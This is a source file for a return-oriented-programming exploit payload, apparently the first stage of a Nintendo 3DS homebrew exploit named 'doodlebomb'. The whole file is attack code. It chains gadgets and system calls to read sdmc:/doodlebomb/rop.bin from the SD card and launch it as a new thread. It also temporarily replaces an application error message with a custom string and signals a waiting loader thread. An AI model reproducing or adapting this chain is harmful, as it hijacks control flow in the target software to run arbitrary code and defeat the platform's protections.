from constants import *
include("macros.py")

LOADER_ARBITER_HANDLE = 0xfff0000

set_mem_offset(STAGE0_DEST)

store(SVC_EXIT_THREAD, STAGE1_DEST)

mount_sdmc(sdmc_string)
try_open_file(context, file_path, FSFILE_READ)
try_get_size(context, file_size)
try_read_file(context, 0, 0, bytes_read, file_size, STAGE1_DEST)
close_file(context)

# Create new thread for stage1
SET_LR(POP_R4R5PC) # skip the two args after create_thread
pop(r0=valid_addr, r3=STAGE1_DEST) # r0=valid address to store unused value
                                      # r3=thread stack pointer
                                      # r1=thread entrypoint, no need to set r1 here since SET_LR already does that
add_word(SVC_CREATE_THREAD)
add_word(0x18) # thread priority
add_word(0xFFFFFFFE) # -2 => execute thread on the default CPU


#GET THE LOCATION OF THE ERROR MESSAGE
deref_to_r0(MSG_TABLE+0xC4)
pop(r1=msg_offset)
add_word(STR_R0R1_POP_R4PC)
put_label("msg_offset")
garbage(1) #r4 overwritten
pop(r0=MSG_TABLE)
add_word(ADD_R0R0R4_POP_R4PC)
garbage(1)
store_r0(msg_loc)


SET_LR(NOP)
mov_r0_to_r1()
pop(r0=original_text, r2=test_string_end-test_string) #dump the original error msg
add_word(MEMCPY)

SET_LR(NOP)
deref_to_r0(msg_loc)
pop(r1=test_string, r2=test_string_end-test_string) #replace the error msg with a custom one
add_word(MEMCPY)

SET_LR(NOP)
deref_to_r0(LOADER_ARBITER_HANDLE)
pop(r1=LOADER_ARBITER_HANDLE+0x4, r2=0x0, r3=0x1, r4=0x0, r5=0x0)
add_word(SVC_ARBITRATE_ADDRESS) # wake up the thread where rop loader is running
garbage(2)

store(0x1, LOADER_ARBITER_HANDLE+0x4) #if stage0 has finished working there's no reason to wait (see arbitrate in rop_loader)

sleep(0x3b9aca00) #sleep a bit before restoring the original error msg

SET_LR(NOP)
deref_to_r0(msg_loc)
pop(r1=original_text, r2=test_string_end-test_string)
add_word(MEMCPY)

add_word(SVC_EXIT_THREAD)

put_label("valid_addr")

put_label("one")
add_word(1)

put_label("file_size")
add_word(0x0)
add_word(0x0)

put_label("msg_loc")
add_word(0x0)

put_label("bytes_read")
add_word(0x0)

put_label("context")
fill(0x20, 0)

put_label("file_path")
add_utf16("sdmc:/doodlebomb/rop.bin\0\0")

put_label("sdmc_string")
add_ascii("sdmc:\0\0\0")

put_label("test_string")
add_utf16("/doodlebomb/rop.bin is missing...\n\nDelete this letter ?\0")
put_label("test_string_end")

put_label("original_text")
fill(test_string_end-test_string, 0)
